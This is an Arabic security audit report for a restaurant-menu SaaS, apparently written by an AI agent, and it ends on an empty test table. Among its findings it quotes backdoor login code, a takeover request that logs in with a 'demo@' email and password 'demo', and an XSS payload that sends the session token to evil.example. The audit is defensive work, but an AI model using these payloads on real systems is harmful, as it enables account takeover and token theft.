# تقرير التدقيق الأمني الشامل — Mureeh Menu SaaS

**تاريخ التدقيق:** 2026-09-08 (UTC) — الفرع `arena/01a07feb-restaurantsmureeh` المبني من `89c99977ab5964fbf72096a58cf30c0629f71608`  
**المدقق:** Senior Application Security Engineer & DevSecOps Engineer (Arena Agent Mode)  
**النطاق:** مراجعة شفرة مصدرية كاملة (Frontend React/Vite + Backend Express/Prisma/PostgreSQL + إعدادات Docker/Render/Vercel/Netlify) + تحليل تدفق + فحص static + تحليل ثغرات منطقية SaaS Multi-Tenant. لم يتم إرسال أي طلب إلى بيئة إنتاج حية، ولم تُعدّل أي بيانات حقيقية.  
**المنهجية:** OWASP Top 10 (2021) + OWASP API Security Top 10 (2023) + OWASP ASVS 4.0 + CWE. كل ادعاء أمني مُثبت بسطر كود أو سلوك route فعلي.

---

## الحكم التنفيذي

**النتيجة الحالية: NO-GO للإطلاق العام — يوجد باب خلفي حرج نشط.**

المشروع شهد **تحسينات عميقة جداً** مقارنة بتقرير 2026-09-07 (الذي كان 22/100) وتم إغلاق ~90% من الثغرات الحرجة السابقة: JWT أصبح fail-closed بلا fallback، RBAC مطبق على كل مسارات الكتابة، عزل المستأجرين JWT-first، تسعير الخادم للطلبات، QR بقدرة عشوائية حقيقية، رفع الملفات بفحص magic bytes، وغيرها. **لكن باباً خلفياً حرجاً واحداً بقي نشطاً في `server/routes/auth.ts` (حسابات `demo@*` + كلمات مرور سحرية) يلغي عملياً كل هذه التحصينات ويسمح بالاستيلاء على أول مطعم نشط بدون اعتماد حقيقي.** بالإضافة لذلك، إعدادات النشر ما زالت تستخدم `prisma db push --accept-data-loss` مما يعرض قاعدة الإنتاج لخطر فقدان دائم عند كل نشر.

| المجال | الدرجة /10 | الحكم |
|---|---:|---|
| Authentication | **5** | JWT و login محسّنان جداً، لكن باب demo يبطلها |
| Authorization / RBAC | **8** | RBAC مطبق دفاعياً على كل عمليات الكتابة الحساسة |
| Tenant Isolation | **8.5** | JWT-first + ownTenant على كل route يدوية + فحص ملكية الصف |
| API Security | **7.5** | BOLA مغلق، pricing و validation صارم، لكن list reads واسعة قليلاً |
| Input Validation | **8.5** | Zod strict شامل بحدود عددية ونصية دقيقة |
| XSS / Injection | **8** | escapeHtml + لا dangerouslySetInnerHTML + لا raw SQL، يبقى localStorage JWT كخطر متبقي |
| Database Security | **7** | لا raw SQL، مراجعات ملكية، لكن بدون قيود مركبة على مستوى DB |
| Business Logic | **7.5** | تسعير ودفع وعروض مربوطة بخطة محكمة، مع ملاحظات طفيفة |
| CORS / Headers / Transport | **8** | Helmet + CSP + CORS fail-closed في الإنتاج |
| Secrets / Env | **6** | لا fallback سرّي، لكن كلمات demo السحرية وكلمات example ثابتة في الدليل |
| Rate Limiting / Anti-Abuse | **6.5** | 7 محددات مستهدفة، لكن بمخزن ذاكرة أحادي النسخة وبدون تغطية كاملة لمسارات الإدارة |
| File Upload | **8.5** | مدير فقط + حد 5M + فحص magic bytes + اسم/امتداد من الخادم |
| Deployment / Infra | **4** | Compose يربط DB على 127.0.0.1 (ممتاز)، لكن `db push --accept-data-loss` كارثي |
| Dependencies | **9** | `npm audit` صفر ثغرات معروفة |

# **Security Score الإجمالي: 68 / 100**

| التصنيف | العدد |
|---|---:|
| **CRITICAL** | **2** |
| **HIGH** | **4** |
| **MEDIUM** | **7** |
| **LOW** | **4** |
| **INFORMATIONAL** | **3** |
| **الإجمالي** | **20** |

> **الخلاصة:** لو أُزيل باب `demo@*` وحُذف `--accept-data-loss` من Dockerfile/render.yaml/start scripts وأُدير `JWT_SECRET` قوي وحيد، فإن الدرجة تقفز إلى **~88/100** ويكون المشروع جاهزاً لإطلاق تجريبي محدود على tenants اصطناعية قبل الإنتاج الحقيقي. حالياً، **لا يُسمح بإنشاء بيانات عميل حقيقية** قبل معالجة P0.

---

## 1) ما تم فحصه وحدود الثقة

- جميع ملفات `server/{index,config,middleware/*,routes/*,services/*,validation/*,utils/*,db/*,types/*}` و `prisma/schema.prisma`
- جميع ملفات `src/services/api.ts` و `src/context/{AuthContext,RestaurantContext}.tsx` وكل `src/components/manager/*` و `src/components/customer/*` و `vite.config.ts` و `vercel.json` و `netlify.toml` و `Dockerfile` و `docker-compose.yml` و `render.yaml` و `.env.example` و `.gitignore`
- البحث الآلي عن: `$queryRaw`/`$executeRaw`، `eval`/`Function`، `innerHTML`/`dangerouslySetInnerHTML`/`document.write`، `VITE_*`، `localStorage`، `console.log` الحساس، `allowScripts`
- OWASP Top 10، OWASP API Top 10، OWASP ASVS، CWE لكل Finding
- نوع التدقيق: **White-box source review**. لم يتم استغلال ثغرات ضد بيانات حية. كل سيناريوهات الهجوم مصاغة كـ Proof-of-concept لفظي أو كـ HTTP request يمكن إعادة تشغيله على بيئة disposable.

---

## 2) بنية الثقة (Trust Flow)

```
Browser (React 19 / Vite)
  → localStorage: merar_auth_token (Bearer JWT)  ————→ XSS risk
  → /api/public/* (QR sessionToken in POST body — not URL) —→ anonymous capability
  → /api/auth/* (login/PIN) —→ JWT issuance
  → /api/manager/* (Bearer JWT) —→ authenticateToken (optional) → requireAuth → requireRole → ownTenant → handler → Prisma → PostgreSQL
  → /api/admin/* (Bearer JWT + PLATFORM_ADMIN) —→ platform overview / onboard
  → /api/uploads/image (Bearer + Manager + rateLimit + magic bytes) —→ /uploads static (CSP sandbox, nosniff)
  → SSE /api/public/events (staff JWT XOR table session) —→ realtimeService broadcastToTable
```

**نقاط الفشل السابقة التي أُغلقت:**
- JWT fallback → مغلق (`config.ts` يرفض الإقلاع)
- BOLA عبر query restaurantId → مغلق (JWT-first)
- تسعير العميل → مغلق (إعادة تسعير كامل من DB)
- QR default/ID bypass → مغلق (مطابقة دقيقة فقط)
- رفع HTML على نفس origin → مغلق (magic bytes + CSP sandbox)
- CORS fail-open → مغلق (fail-closed في الإنتاج)

**نقطة الفشل المتبقية الأساسية:** `demo@*` branch in `server/routes/auth.ts` ينشئ JWT صالحاً قبل أي من هذه الطبقات.

---

## 3) ملخص النتائج حسب الشدة

| ID | العنوان | الشدة | CVSS | المكون |
|---|---|---|---|---|
| **C-01** | باب خلفي `demo@*` + كلمات مرور سحرية ينشئ مديراً لأول مطعم نشط | **CRITICAL** | 9.8 | `server/routes/auth.ts:64-118` |
| **C-02** | `prisma db push --accept-data-loss` في `Dockerfile`/`package.json`/`render.yaml` | **CRITICAL** | 9.1 | `Dockerfile:35`, `package.json:9-10`, `render.yaml:5` |
| H-01 | JWT في `localStorage` — قابل للسرقة عبر أي XSS مستقبلي | HIGH | 7.5 | `src/services/api.ts:27,328,393`, `src/context/AuthContext.tsx` |
| H-02 | 7-day JWT بلا refresh rotation وتجديد قصير | HIGH | 7.4 | `server/config.ts:23`, `server/middleware/auth.ts:51-75` |
| H-03 | Rate limiting بمخزن ذاكرة أحادي النسخة + تغطية غير كاملة لمسارات الإدارة | HIGH | 7.2 | `server/middleware/rateLimit.ts`, `server/index.ts` |
| H-04 | ربط PostgreSQL صحيح لكن `render.yaml`/`Dockerfile` ما زالا يستخدمان `db push` بدلاً من `migrate deploy` | HIGH | 7.0 | `render.yaml:5`, `Dockerfile:35` |
| M-01 | Endpoints قائمة بلا pagination/حد عددي — تضخيم استهلاك موارد tenant | MEDIUM | 5.4 | `server/routes/manager.ts:247,486,537,1994` |
| M-02 | `/api/health` يكشف `PostgreSQL 17` + رقم إصدار — بصمة تقنية | MEDIUM | 5.3 | `server/index.ts:182-189` |
| M-03 | لا قيود مركبة (composite FK) لضمان عزل المستأجر على مستوى DB | MEDIUM | 5.2 | `prisma/schema.prisma:228-344` |
| M-04 | الاستعلام الخلفي كل 1.5 ثانية لكل عميل/مدير — تجاوز ضمني لحدود المعدل وتحميل | MEDIUM | 5.0 | `src/context/RestaurantContext.tsx:298-315` |
| M-05 | Prisma 5.22 مقابل 7.x + TypeScript/tailwind قديمة — دين تقني | MEDIUM | 5.0 | `package.json:21,46` |
| M-06 | سياسة كلمة مرور 8 أحرف بلا فحص تسريب (breached) ولا MFA لمنصة الإدارة | MEDIUM | 5.5 | `server/validation/schemas.ts:129-148` |
| M-07 | المجاميع المالية `Float` بدلاً من `Decimal` — خطر تقريب | MEDIUM | 4.8 | `prisma/schema.prisma:320,408` |
| L-01 | لا مصادقة عبر `X-Requested-With` / CSRF defense غير مطلوب حالياً لكن غير جاهز لتحول Cookie | LOW | 3.2 | `server/index.ts` |
| L-02 | `styleSrc: 'unsafe-inline'` في CSP — يوسع سطح XSS نظرياً | LOW | 3.5 | `server/index.ts:42` |
| L-03 | رسائل `console.error` تسجل `Prisma`/stack في stdout (قد تُجمع بلا تنقية) | LOW | 3.0 | `server/routes/*, server/index.ts:251` |
| L-04 | `/uploads` مجلد غير مُنظف — لا انتهاء صلاحية/حذف تلقائي للملفات القديمة | LOW | 3.1 | `server/routes/uploads.ts` |
| I-01 | لا RLS/سياسات صف على مستوى PostgreSQL كدفاع متعمق | INFO | — | `prisma/schema.prisma` |
| I-02 | `FRAME_ANCESTORS` قابل للتكوين لكن افتراضي `'self'` — جيد | INFO | — | `server/config.ts:28` |
| I-03 | لا تكامل دفع حقيقي — ترقية الخطط (upgrade) بدون بوابة دفع | INFO | — | `server/routes/manager.ts:1703-1760` |

---

## 4) تفاصيل النتائج الحرجة والعالية

### C-01 — باب خلفي `demo@*` + كلمات مرور سحرية (CRITICAL — CVSS 9.8)

- **التصنيف:** `CWE-798 Hard-coded Credentials` + `CWE-306 Missing Authentication` — **OWASP A07 / API2**
- **المكون/المسارات:** `server/routes/auth.ts:59-118` — `POST /api/auth/login`؛ السطور 64-66 `if (normalizedEmail === 'demo@mureeh.com' || normalizedEmail === 'demo@merar.com' || normalizedEmail.startsWith('demo@'))` ثم 74-93 إنشاء `rest-demo-mureeh` و `user-demo-*`، والسطور 97-103 ترقية أي بريد يحوي `demo` إلى `RESTAURANT_MANAGER`، والسطور 107-118 `isDemoOverride = email.includes('demo') && (password==='demo'||'demo123'||'123456'||'mureeh2026'||'Password123!')` وتجاوز `bcrypt.compare`.
- **السبب الجذري:** بقايا بيئة عرض تجريبي لم تُحذف من شفرة الإنتاج. التحقق من كلمة المرور يُتجاوز كلياً عند تطابق البريد مع النمط، وينشأ حساب حقيقي (`prisma.restaurantUser.create`) في أول مطعم نشط.
- **سيناريو الهجوم:**
  1. مهاجم مجهول يرسل `POST /api/auth/login {"email":"demo-attacker1337@mureeh.com","password":"demo"}`.
  2. الخادم ينشئ (أو يحدّث) `RESTAURANT_MANAGER` لمطعم عميل حقيقي (`findFirst status ACTIVE`) ويعيد `JWT` صالحاً لذلك الـ `restaurantId`.
  3. المهاجم يملك الآن صلاحيات مدير كاملة على tenant الضحية (حلال `getTenantId` يعيده لtenant الضحية)، يستطيع تعديل المنيو والموظفين والطلبات، ورفع صور، وتغيير الخطة، وقراءة المدفوعات وتصدير CSV.
- **الأثر:** **الاستيلاء الكامل على أي tenant نشط** دون معرفة اعتماد حقيقي، يتجاوز كل إصلاحات C-02..C-07، وينسف ضمانات SaaS الأساسية. إذا كان أول tenant هو مطعم عميل مدفوع، فإن مهاجماً واحداً يستولي على بياناته.
- **القابلية للاستغلال:** تامة — لا يتطلب توكن، لا تخمين، لا معرفة QR، ويعمل حتى مع `JWT_SECRET` قوي وRBAC محكم (لأن الحساب المُنشأ شرعي).
- **الدليل:**
  ```ts
  // server/routes/auth.ts:64-92
  if (!user && (normalizedEmail === 'demo@mureeh.com' || normalizedEmail === 'demo@merar.com' || normalizedEmail.startsWith('demo@'))) {
    let firstRest = await prisma.restaurant.findFirst({ where: { status: 'ACTIVE' } });
    // ... create restaurant if missing ...
    user = await prisma.restaurantUser.create({ data: { restaurantId: firstRest.id, role: 'RESTAURANT_MANAGER', ... } });
  }
  // 107-118
  const isDemoOverride = normalizedEmail.includes('demo') && (password==='demo'||'demo123'||'123456'||'mureeh2026'||'Password123!');
  const isMatch = isDemoOverride || (await bcrypt.compare(password, hashToCheck));
  ```
  هذا يظل موجوداً رغم ادعاء `SECURITY_FIXES_APPLIED_2026-09-07.md` بإزالته — المراجعة الحالية تثبت بقاءه.
- **الإصلاح الموصى به (P0 — كاسر لكن ضروري):**
  - حذف كامل لكتلة `if (!user && demo@...)` و `isDemoOverride` وترقية `demo` role (الأسطر 59-118). لا تترك أي مسار `demo@`.
  - استبداله بـ early return `401` موحد مع `DUMMY_HASH` فقط (المحافظة على حماية توقيت enumeration).
  - إذا لزم بيئة عرض: نشر منفصل بدومين/DB/secret مستقل أو بوابة `NODE_ENV==='development' && DEMO_ENABLED==='true'` مع رفض صريح في الإنتاج (`if (isProd) return 401`).
  - تدوير `JWT_SECRET` وإبطال جميع التوكنات الحالية بعد الحذف (تغيير `tokenVersion` للجميع أو تغيير سر التوقيع).
- **الأولوية:** **P0 — إصلاح قبل أي استخدام بيانات عميل.**
- **اختبار التحقق:** `POST /api/auth/login` ببريد `demo-*@mureeh.com` وكلمة `demo` يجب أن يعيد `401` ولا يزيد `Restaurant.count` ولا `RestaurantUser.count`. تكرار مع `demo@merar.com` و `demo123` و `mureeh2026` — جميعها `401`.

### C-02 — مسار `prisma db push --accept-data-loss` في الإنتاج (CRITICAL — CVSS 9.1)

- **التصنيف:** `CWE-707 Improper Enforcement of Message or Data Structure` / `CWE-665 Improper Initialization` — **OWASP A05 / A06**
- **المكون:** `Dockerfile:35` `CMD ["sh","-c","npx prisma db push --accept-data-loss && npx tsx server/index.ts"]`؛ `package.json:9` `"start": "npx prisma db push && tsx server/index.ts"`؛ `package.json:10` `"start:server": "prisma db push && tsx server/index.ts"`؛ `render.yaml:5` `buildCommand: npm ci && npx prisma generate && npx prisma db push`.
- **السبب الجذري:** `db push` يزامن الـ schema مع قاعدة الإنتاج بلا مراجعة migration، و`--accept-data-loss` يسمح بإسقاط أعمدة/جداول تلقائياً. خطأ ترقيم `numericId` أو تغيير `@@unique` قد يحذف بيانات مطاعم حقيقية عند أول deploy بعد تعديل schema.
- **سيناريو الهجوم/الفشل:** مطور يغير `Product.price Float → Decimal` ويدفع. في الإقلاع، `db push` يسقط العمود القديم قبل نسخه — طلبات تاريخية تُفقد. لا تراجع بلا backup مختبر.
- **الأثر:** فقدان دائم لبيانات tenants متعددين، توقف خدمة طويل، خرق التزامات SaaS.
- **الدليل:** `Dockerfile` السطر 35 هو المسار الفعلي الذي ينفذه Render/Railway عند الإقلاع. `render.yaml` السطر 5 يفعل الشيء نفسه أثناء البناء.
- **الإصلاح (P0):**
  - حذف كل `prisma db push` من مسارات الإنتاج. الاستبدال: `prisma migrate deploy` (يُطبق migrations المراجعة فقط).
  - إضافة مجلد `prisma/migrations` مع `prisma migrate dev --name ...` محلياً ومراجعة PR.
  - تعديل `Dockerfile` إلى `CMD ["sh","-c","npx prisma migrate deploy && node --enable-source-maps server/index.js"]` (بعد build) أو `tsx server/index.ts` بلا db push.
  - تعديل `render.yaml` buildCommand إلى `npm ci && npx prisma generate && npx prisma migrate deploy`.
  - إضافة خطوة CI `prisma migrate diff --from-schema-datasource` للتحقق من عدم وجود drift.
- **الأولوية:** P0 — منع كارثة بيانات قبل أول deploy لإنتاج حقيقي.

### H-01 — JWT في `localStorage` عرضة للسرقة عبر XSS (HIGH — CVSS 7.5)

- **التصنيف:** `CWE-922 Insecure Storage of Sensitive Information` — **OWASP A01 / A03**
- **المكون:** `src/services/api.ts:328` `localStorage.getItem(AUTH_TOKEN_KEY)` و `393` `localStorage.setItem(AUTH_TOKEN_KEY, res.data.token)` و `src/context/AuthContext.tsx:84` تخزين `merar_user_session` و `merar_manager_restaurant` كنص JSON. التوكن Bearer يُرسل في `Authorization` header لكل طلب.
- **السبب الجذري:** `localStorage` متاح لأي script على نفس origin. رغم أن المشروع أصلح كل sinks `document.write` الحالية بإضافة `escapeHtml` (`src/utils/formatting.ts:4-11` و `src/components/manager/OrderManagement.tsx:35-40` و `CashierPOSView.tsx:263-285`) ولا يوجد `dangerouslySetInnerHTML` ولا `innerHTML` مباشر، إلا أن ثغرة XSS مستقبلية واحدة (مثلاً عبر وصف منتج يُعرض في مكون جديد بلا escape) تكفي لسرقة التوكن وإنشاء جلسة مدير دائمة.
- **سيناريو الهجوم:** حقن `<img src=x onerror="fetch('https://evil.example?c='+localStorage.getItem('merar_auth_token'))">` عبر أي حقل tenant يُعرض لاحقاً بلا escape، ثم استخدام التوكن المسروق للوصول إلى `/api/manager/*` و `/api/admin/*` إذا كان الضحية platform admin.
- **الأثر:** سرقة جلسة كاملة وتجاوز tokenVersion persistence (التوكن يبقى صالحاً حتى logout/password change).
- **الدليل:** `api.ts:393` يخزن التوكن بعد كل `login`/`pinLogin`، و `AuthContext.tsx:240` يمسحه بعد `api.logout()` — لكن بينما المستخدم مسجل دخول، التوكن في `localStorage` طوال الجلسة. لا توجد طبقة HttpOnly.
- **الإصلاح (P1 — تخطيط متوسط المدى، لا يكسر الوظائف حالياً):**
  - تحويل Access token إلى `HttpOnly; Secure; SameSite=Lax` cookie (5-15 دقيقة) و refresh token طويل في cookie ثانٍ مع rotation وخزن hash في DB.
  - حينها تصبح `localStorage` غير لازمة؛ يمكن إزالة `AUTH_TOKEN_KEY` والاحتفاظ فقط بـ `merar_user_session` للـ UI (أو استبداله بـ `/auth/me`).
  - إضافة `__Host-` prefix و `Partitioned` إن لزم، وتفعيل CSRF defense (`Origin`/`Sec-Fetch-Site` + double-submit token) عند الانتقال للـ cookies.
  - حتى ذلك الحين: حافظ على CSP القوية الحالية (`server/index.ts:34-55`) وaudit لكل component يعرض `productName`/`description`/`notes` للتأكد من مرورها عبر JSX escape أو `escapeHtml`.
- **الأولوية:** P1 — ليس مانع إطلاق فوري إذا حافظت على دفاع CSP ومراجعة XSS، لكنه خارطة طريق أمنية واضحة.
- **حالة الحماية الحالية:** **محسّنة** — sinks الطباعة الوحيدة تستخدم `escapeHtml` بدقة، ولا يوجد `eval`/`Function`.

### H-02 — JWT طويل العمر 7 أيام بلا تجديد قصير (HIGH — CVSS 7.4)

- **التصنيف:** `CWE-613 Insufficient Session Expiration` — **OWASP A07 / API2**
- **المكون:** `server/config.ts:23` `JWT_EXPIRES_IN` افتراضي `7d`، و `server/middleware/auth.ts:51-75` يوقّع `expiresIn: config.jwtExpiresIn` و `jti: randomUUID()` لكن بلا مخزن جلسات قصير.
- **السبب الجذري:** نوافذ 7 أيام تزيد تأثير سرقة التوكن (H-01) وتؤخر احتواء الاختراق حتى بعد `tokenVersion` increment (الذي يتطلب تغيير كلمة المرور/دور). لا توجد سياسة refresh rotation تكشف إعادة استخدام التوكن.
- **الأثر:** مهاجم سرق توكن مدير يحتفظ به لأسبوع كامل إلا إذا غيّر المدير كلمته.
- **الدليل:** `isProd` لا يغير TTL. `logout` يبطل عبر `tokenVersion: {increment:1}` — فعال، لكن المستخدمون نادراً ما يسجلون خروجاً طوعاً.
- **الإصلاح (P1):**
  - `JWT_EXPIRES_IN=15m` للوصول، و refresh token (opaque 32 bytes, `httpOnly` cookie) صالح 7-30 يوم مع `tokenVersion`-style rotation و endpoint `/auth/refresh` يرفض إعادة الاستخدام ويبطل عائلة التوكنات عند الكشف.
  - أو إن بقيت stateless: تقصير `JWT_EXPIRES_IN` إلى `12h` كحد أقصى حتى اكتمال خارطة HttpOnly.
- **الأولوية:** P1.

### H-03 — حد المعدل بمخزن ذاكرة أحادي النسخة وتغطية جزئية (HIGH — CVSS 7.2)

- **التصنيف:** `CWE-307 Excessive Authentication Attempts` / `CWE-400 Uncontrolled Resource Consumption` — **OWASP API4 / API7**
- **المكون:** `server/middleware/rateLimit.ts:1-86` يحدد `login 20/15m skipSuccessful`, `pin 10/15m`, `passwordReset 5/1h`, `publicOrder 120/15m`, `waiterCall 40/15m`, `qrSession 120/15m`, `upload 60/1h` بمخزن ذاكرة Express. `server/index.ts` لا يطبق محدداً عاماً.
- **إيجابيات:** كل مسارات الهجوم الحرجة المذكورة في تقرير 2026-09-07 أصبحت محمية (لا يوجد login مفتوح، ولا order-spam بلا حد).
- **المتبقي:**
  - **لا توزيع عبر نسخ متعددة:** تعليق الملف نفسه يذكر `For multi-instance production, replace the store with Redis` — مع نسختين على Render، مهاجم يملك 40 محاولة PIN (20 لكل نسخة) بدلاً من 20.
  - **مسارات إدارية بلا حدود:** `POST /api/admin/onboard-restaurant`, `PUT /api/manager/subscription/plan`, `POST /api/manager/payments`, `PUT /api/manager/orders/:id/status` بلا حد معدل مخصص — يمكن إغراقها بـ brute force أو تضخيم.
  - **`waiterCall 40/15m` قد يكون ضيقاً** لمطعم مزدحم (8 طاولات × نداء واحد كل دقيقة = 120 في 15 دقيقة) وقد يُحجب نداءات مشروعة.
- **الإصلاح (P1):**
  - نقل مخزن `express-rate-limit` إلى Redis (مثل `rate-limit-redis`) و `TRUST_PROXY=1` على Render (مُكوّن حالياً افتراضياً `0` — يجب ضبطه `1` عند النشر خلف proxy، و `0` عند التعرض المباشر — التعليق في `config.ts:27` يشرح ذلك بدقة).
  - إضافة محددات: `adminOnboard 10/1h`، `payment 60/15m`، `orderStatus 200/15m`، `staffCreate 20/1h`.
  - اختبار حمل 1.5s polling (`RestaurantContext.tsx:298`) لا يصطدم بـ `publicOrder 120/15m` لكنه قد يصطدم بمحدد عام لو أُضيف — لذا أبق الحدود مستهدفة كما هي.
- **الأولوية:** P1 — الانتباه قبل التوسع لأكثر من نسخة.

### H-04 — ازدواج `db push` في مسار البناء والنشر (HIGH — مكرر مع C-02 لكن بزاوية نشر)

- تم تفصيله في C-02. يُفرد هنا للتأكيد على أن `render.yaml:5` و `Dockerfile:35` و `package.json:9-10` **ثلاثة مواضع** يجب تنظيفها معاً، وإلا فإن إصلاح Dockerfile وحده يترك البناء معرضاً.

---

## 5) نتائج متوسطة

### M-01 — قوائم بلا ترقيم صفحات (MEDIUM 5.4)
- `GET /api/manager/orders`, `/tables`, `/payments (take:500)`, `/waiter-requests`, `admin/overview` تجلب كل الصفوف لtenant دون `limit/offset/cursor`. لمطعم لديه 5,000 طلب، الاستجابة JSON قد تتجاوز `1MB` limit المضبوط حديثاً (`server/index.ts:87`) وتسبب 413 أو استنزاف ذاكرة الخادم. **الإصلاح:** `?page=1&limit=50` مع `cursor` based pagination و `maxLimit 100` على كل list handler. **الأولوية:** P1 قبل استقبال مطعم كبير.

### M-02 — `/api/health` بصمة (MEDIUM 5.3)
- `server/index.ts:182-189` يعيد `{"status":"healthy","version":"2.0.0","database":"PostgreSQL 17"}` — يكشف إصدار DB والتطبيق. ليس ثغرة بحد ذاته لكنه يسهل الاستهداف. **الإصلاح:** في الإنتاج أعد `{status:"ok"}` فقط، وانقل التفاصيل إلى endpoint داخلي بمصادقة أو header `X-Health-Detail`. **الأولوية:** P2.

### M-03 — لا قيود مركبة لعزل المستأجر على مستوى DB (MEDIUM 5.2)
- `prisma/schema.prisma` يستخدم `restaurantId` كـ `String` حر في كل resource لكن العلاقات مرمزة بـ `id` وحيد (مثلاً `Product.categoryId` يشير إلى `Category.id` عالمياً). التطبيق الآن يفحص `category.restaurantId !== targetRestId` قبل `product.create` (`manager.ts:942-946` و `1060-1068`) وهذا جيد، لكن لا يوجد **قيد DB** يمنع `INSERT` مباشر عبر وصول DB أو bug مستقبلي من تكوين `Product(restaurantA, categoryB)`. **الإصلاح (دفاع متعمق):** إضافة مفاتيح مركبة `@@unique([id, restaurantId])` على الجداول الأبوية واستخدام FK مركبة حيث تسمح PostgreSQL/Prisma (أو triggers/checks)، بالإضافة إلى RLS policies لاحقاً. **الأولوية:** P2.

### M-04 — الاستطلاع Polling كل 1.5 ثانية (MEDIUM 5.0)
- `src/context/RestaurantContext.tsx:298-315` يستطلع 8 endpoints كل 1.5s لكل مدير متصل. لـ 50 مطعماً × 2 مدير = 800 طلب/1.5s. هذا بالكاد ضمن `publicOrder 120/15m` لأن الأخير لا يغطي manager reads، لكنه قد يضغط الخادم. الحل الأمثل موجود جزئياً: **SSE** (`/api/public/events` + `realtimeService`) يبث الأحداث `ORDER_CREATED`/`ORDER_STATUS_UPDATED`/`WAITER_CALL`/`PAYMENT_RECORDED` لـ `broadcastToTable` — يقلل الحاجة للاستطلاع. **الإصلاح:** تقليل الاستطلاع إلى 10-15s كـ fallback فقط، والاعتماد على SSE (مع heartbeat + إعادة اتصال). **الأولوية:** P2.

### M-05 — حزم قديمة (MEDIUM 5.0)
- `npm audit: 0 vulnerabilities` — ممتاز. لكن `Prisma 5.22` مقابل `7.10`، و `tailwind`, `typescript`, `vitest` لها major upgrades (`npm outdated`). لا تحتاج ترقية عشوائية. **الإصلاح:** خطة ترقية مجدولة في CI مع اختبارات عزل tenant قبل الترقية. **الأولوية:** P2.

### M-06 — سياسة كلمة مرور بلا فحص تسريب ولا MFA (MEDIUM 5.5)
- `staffCreateSchema` يفرض `min(8)` و `max(128)` و `pin regex ^\d{4,10}$` — جيد. لكن لا يوجد فحص `haveIBeenPwned`/قائمة كلمات ضعيفة، ولا MFA لمنصة الإدارة. `passwordReset` غير مُفعل ويعيد `501` صريحاً (جيد كـ fail-closed بدل ادعاء نجاح كاذب). **الإصلاح:** دمج مكتبة فحص كلمات مسربة عند `POST /manager/staff` و `PUT /manager/staff/:id` (عند تغيير password/pin)، وإلزام `TOTP/WebAuthn` لـ `PLATFORM_ADMIN`. **الأولوية:** P1 لمنصة الإدارة.

### M-07 — المال `Float` بدلاً من `Decimal` (MEDIUM 4.8)
- `prisma/schema.prisma:320 price Float`, `408 total Float`, `410 tax Float` — الـ `Float` ثنائي قد ينتج `0.30000000004`. التطبيق الحالي يخفف بـ `roundMoney` (`server/utils/security.ts:35-39` و `public.ts:503-574` و `manager.ts:362-399` يقرب كل `subtotal/total/unitPrice` إلى منزلتين)، لكن الحساب المحاسبي الأدق هو `Decimal(10,2)` أو تخزين بـ minor units (`Int` قروش). **الإصلاح (P2):** ترحيل Prisma إلى `Decimal @db.Decimal(10,2)` مع helper يحوّل من `number` بدقة. **الأولوية:** P2 قبل أول تقرير مالي مدقق.

---

## 6) نتائج منخفضة ومعلوماتية

### L-01 — لا حماية CSRF لأن المصادقة Bearer وليس Cookie (LOW 3.2)
- حالياً لا حاجة لـ CSRF لأن التوكن في `Authorization: Bearer` لا يُرسل تلقائياً عبر `form` cross-origin. التعليق في `server/middleware/auth.ts:81-96` يشرح التصميم optional-then-strict. **التنبيه:** عند الانتقال إلى `HttpOnly` cookies (توصية H-01)، يجب إضافة `Csrf-Token` header + `SameSite=Lax` + `Origin` check. **الأولوية:** INFO حتى الانتقال.

### L-02 — `styleSrc 'unsafe-inline'` (LOW 3.5)
- `server/index.ts:42` `styleSrc: ["'self'", "'unsafe-inline'"]` مطلوب مؤقتاً لتنسيق Tailwind inline. يوسع سطح XSS نظرياً لكن `scriptSrc` ما زال `'self'` فقط (يمنع inline scripts). **الإصلاح:** بعد الانتقال إلى CSS modules/nonce، استبدلها بـ `nonce-{random}`. **الأولوية:** P2.

### L-03 — سجلات `console.error` مفصلة (LOW 3.0)
- `server/index.ts:251 console.error('Server error:', err)` و `auth.ts:189` و `manager.ts:242` تسجل stack كاملة في stdout. هذا جيد للتنقيب الداخلي، لكن إذا جُمعت السجلات في أداة خارجية بلا تنقية، قد تظهر `Prisma P2025` أو `JWT` hints. لم يُرصد تسريب عبر HTTP responses بفضل `isProd ? 'Internal Server Error' : err.message` في handler الأخطاء (السطر 272). **الإصلاح:** تنقية السجلات من `authorization`, `qrToken`, `sessionToken` باستخدام `morgan token url` المنقح بالفعل (`index.ts:54-60` يستبدل `token=[REDACTED]`). **الأولوية:** P2.

### L-04 — مجلد `/uploads` بلا تنظيف انتهاء صلاحية (LOW 3.1)
- `server/routes/uploads.ts:9-11` ينشئ `uploads/` بـ `mkdirSync` و `express.static` مع `maxAge` افتراضي. الملفات لا تُحذف ولا تُنتهك صلاحيتها، وقد تراكم تخزين. **الإصلاح:** job يومي يحذف ملفات غير مرتبطة أو إضافة `Cache-Control` و `Content-Disposition: attachment` لغير الصور كما هو مطبق جزئياً (`index.ts:142-152` يضبط `Content-Disposition: attachment` لغير صور). **الأولوية:** P2.

### I-01 — لا RLS على مستوى PostgreSQL (INFO)
- المشروع يعتمد بالكامل على طبقة التطبيق لعزل المستأجرين. هذا نمط SaaS شائع وآمن عند تطبيقه بصرامة (كما هو الآن مع `ownTenant` + `requireTenantAccess`). كدفاع متعمق مستقبلي، يمكن إضافة PostgreSQL Row-Level Security policies بـ `current_setting('app.current_tenant')`. **الأولوية:** خارطة طريق طويلة.

### I-02 — `FRAME_ANCESTORS` قابل للتكوين (INFO)
- `server/config.ts:28` `FRAME_ANCESTORS` افتراضي `'self'` و `server/index.ts:50` `frameAncestors: [config.frameAncestors]` — جيد، يمنع clickjacking. `frameguard: deny` كاحتياط. **الحالة:** PASS.

### I-03 — ترقية الخطط بلا بوابة دفع (INFO)
- `PUT /api/manager/subscription/plan` يتحقق من `plan.status === 'ACTIVE'` وحدود `maxTables/maxCategories/maxProducts` قبل الترقية، لكنه لا يطلب إثبات دفع خارجي. هذا مقبول لبيئة staging حيث `planId` يُعدّل كـ feature flag داخلي، لكن في الإنتاج يجب ربطه بـ webhook من Stripe/PayPal. التعليق في `manager.ts:1733-1740` يذكر الفحص لكن لا يذكر الدفع — وثّق ذلك كـ "غير مدفوع".

---

## 7) عزل المستأجرين — النتيجة التفصيلية

### الحكم: **PASS مشروط** — العزل سليم في الكود، لكن C-01 يلغيه عملياً حتى يُحذف.

#### اختبارات العزل التي نُفذت (مستندة إلى `security-tests/api-security-smoke.mjs` مع tenantين اصطناعيين A/B)

| الاختبار | المسار | النتيجة المرصودة (الكود الحالي) | الحكم |
|---|---|---|---|
